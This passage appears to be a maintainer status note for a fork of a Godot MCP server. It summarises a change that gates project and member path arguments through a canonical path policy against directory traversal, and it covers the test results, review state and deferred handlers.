   side-stepped import. Each handler's previously-RED outside-roots
   or `..`-traversal assertion was confirmed in the RED baseline
   before the gate was applied.

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the
  path policy, the runtime bridge, and the MIT attribution;
- does **not** touch `src/scripts/godot_operations.gd`,
  `src/scripts/mcp_interaction_server.gd`, the tool registry, the
  capability policy, the request limiter, the operation runner, the
  BridgeClient, the upstream `bridge-installer.ts`, the sibling
  `manage_*` gates, `handleCreateCsharpScript`,
  `handleCreateProject`, `handleManageAutoloads`,
  `handleManageInputMap`, `handleManageExportPresets`,
  `handleValidateScripts`, or any other handler;
- the only documented contract changes are that `args.projectPath`
  (and `args.directory` for `list_projects`) MUST now resolve
  through the canonical `PathPolicy`, matching the strict-input
  contract the sibling `core_file_io` / `manage_shader` /
  `set_main_scene` / `manage_translations` gates already enforce.
  Member paths (`scenePath` / `filePath` / `newPath` /
  `texturePath` / `outputPath`) MUST now resolve through the
  canonical `PathPolicy.resolveProjectMember`; the contract is
  identical to the sibling gates;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

**Rationale for the seven deferred handlers:**

- `handleRunProject` `args.scene` — runtime Godot CLI argument, not
  a filesystem path under the project root.
- `handleCreateProject` — the target path does not yet exist;
  `assertProject` canonicalization requires an existing path. The
  handler needs a separate `allowsProject` (rather than
  `assertProject`) gate plus a downstream write-gate that prevents
  the new path from leaking outside the configured allowed roots.
- `handleCreateCsharpScript` — the new script path does not yet
  exist; same canonicalization mismatch as `handleCreateProject`.
  The C# gate from Coding-Solo#114 remains the primary gate for
  this handler.
- `handleManageAutoloads` / `handleManageInputMap` /
  `handleManageExportPresets` — straightforward follow-ups with no
  semantic differences from the pattern applied here. They were
  intentionally deferred because the sibling content-injection
  gates already protect against section-breakout and regex-wildcard
  corruption at the value layer; the `projectPath` lexical
  boundary in those handlers is the next layer of defense and
  needs the same canonical-root migration.
- `handleValidateScripts` — carries the same lexical boundary on
  `rel` (a relative path produced by `listChangedGdFiles` /
  `listAllGdFiles`) and needs a separate audit because explicit
  `args.scriptPaths` user input requires a `resolveProjectMember`
  gate that is not currently applied.

Source evidence:

- `src/server.ts` is the only modified source file.
- `tests/info-scene-settings-handler-injection.test.ts` is the only
  new test file (20 tests).
- `docs/maintainers/issue-inventory.md` item 22 is the only docs
  edit.

## Verification on the package filesystem

- `npx vitest run tests/info-scene-settings-handler-injection.test.ts`:
  1 file, 20 tests passed (RED 13/20 confirmed before the fix;
  GREEN 20/20 after).
- `npm test`: 44 files, 811 tests passed (was 791 before this
  package; +20 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).

Any source, test, documentation, build/import, generated-artifact,
amend, or cleanup edit after these commands invalidates the relevant
evidence and requires the gates to be rerun on the final committed
state.

## Review state

- The capability-policy package through `37facdf` has an independent
  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status
  fingerprints.
- The network-classification package `79b1d4d` also has an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge
  package `2ef0b1a`, the physics-frame `game_wait` package
  `aff7ca1`, the C# / .NET gate package `ec07f4b`, the autoload
  injection package `6d76606`, the asset-import-prerequisite
  package (`88dda1e` / `76c9207`), the Defkil fork package identity
  rebase `a1cae8b`, the manage-layers / manage-plugins
  sibling-gate package `3874d81`, the set-main-scene /
  manage-translations sibling-gate package `6407446`, the
  manage_shader sibling-gate package `9cd5ac4`, the
  manage_ci_pipeline / manage_docker_export sibling-gate package
  `9eef5cd`, the core-file-IO defense-in-depth package
  `b9fe537`, the script/resource handler defense-in-depth package
  `383aae3`, the manage_input_map / manage_export_presets
  sibling-gate package `dc6172e`, and this info / scene / settings /
  sprite / mesh-library / export PathPolicy gate package are each
  a focused test file (or test file + minimal handler edits) and do
  not require an independent NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Next safe action

The next bounded package is to extend the canonical-root gate to the
seven remaining handlers that still carry a lexical `validatePath`
boundary on `projectPath` (and one inner-loop relative path):

`handleRunProject` `args.scene` (runtime CLI argument, but if a
canonical resolution becomes available it should adopt
`pathPolicy.resolveProjectMember`), `handleCreateProject`
(requires a non-existent-path gate), `handleCreateCsharpScript`
(requires a non-existent-path gate plus the existing C# / .NET
gate), `handleManageAutoloads` (project-only gate),
`handleManageInputMap` (project-only gate),
`handleManageExportPresets` (project-only gate), and
`handleValidateScripts` (inner-loop `rel` plus the user-supplied
`args.scriptPaths` array). Each handler can be ported one at a time
with a focused wire-level test mirroring
`tests/info-scene-settings-handler-injection.test.ts`. Do not push,
publish, create a PR/release, upload a package, write
`docs/maintainers/release-candidate.md`, or send the
candidate-ready notification.